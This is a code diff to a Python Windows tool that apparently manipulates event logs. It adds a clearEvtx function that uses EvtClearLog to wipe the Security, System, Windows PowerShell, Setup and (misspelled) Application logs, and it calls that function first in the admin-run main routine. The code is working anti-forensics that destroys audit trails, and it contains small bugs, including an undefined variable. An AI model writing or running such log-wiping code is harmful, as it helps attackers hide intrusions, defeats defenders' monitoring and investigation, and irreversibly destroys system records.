@@ -4,6 +4,8 @@ from pathlib import Path
 from pywintypes import Time
 from random import getrandbits
 from pywintypes import error as wintError
+import ctypes
+from ctypes.wintypes import BOOL, HANDLE, LPCWSTR, DWORD
 import datetime as dt
 from win32file import *
 from os import stat
@@ -24,6 +26,44 @@ badFileColor=Fore.YELLOW+Back.RED
 goodst=Fore.GREEN
 warnst=Fore.RED
 reset=Style.RESET_ALL
+
+# Function to erase evtx logs
+def clearEvtx():
+    # Main Variables
+    wevtapi = ctypes.WinDLL('wevtapi.dll')
+
+    EvtClearLog = wevtapi.EvtClearLog
+    EvtClearLog.argtypes = [HANDLE, LPCWSTR, LPCWSTR, DWORD]
+    EvtClearLog.restype = BOOL
+
+    EvtOpenLog = wevtapi.EvtOpenLog
+    EvtOpenLog.argtypes = [HANDLE, LPCWSTR, DWORD]
+    EvtOpenLog.restype = HANDLE
+    
+    EvtClose = wevtapi.EvtClose
+    EvtClose.argtypes = [HANDLE]
+    EvtClose.restype = BOOL
+
+    NULL = None
+    EVT_HANDLE = HANDLE
+    EVT_LOG_READ_ACCESS = 0x1
+
+    for logFile in ["Aplication", "Security", "Windows Powershell", "System", "Setup"]:
+        h_log = EvtOpenLog(NULL, logFile, EVT_LOG_READ_ACCESS)
+        if not h_log:
+            raise ctypes.WinError(ctypes.get_last_error(), f"Failed to open log: {logFile}")
+    
+        success = EvtClearLog(NULL, logFile, NULL, 0)
+        if not success:
+            error_code = ctypes.get_last_error()
+            EvtClose(h_log)
+            raise ctypes.WinError(error_code, f"Failed to clear log: {logFile}")
+    
+        if not EvtClose(h_log):
+            raise ctypes.WinError(ctypes.get_last_error(), f"Failed to close log handle: {log_name}")
+
+        print(f"{goodst}[+]{reset} The file: {fileColor+logFile+reset} has been successfully cleared")
+
 
 # Function to get headers of event logs
 def getEvtx():
@@ -172,6 +212,8 @@ def joiner(logFile):
 @main_requires_admin
 # Main function with admin perms
 def main():
+    clearEvtx()
+                
     evtxLogs=getEvtx()
     for logFile in evtxLogs:
         joiner(logFile)
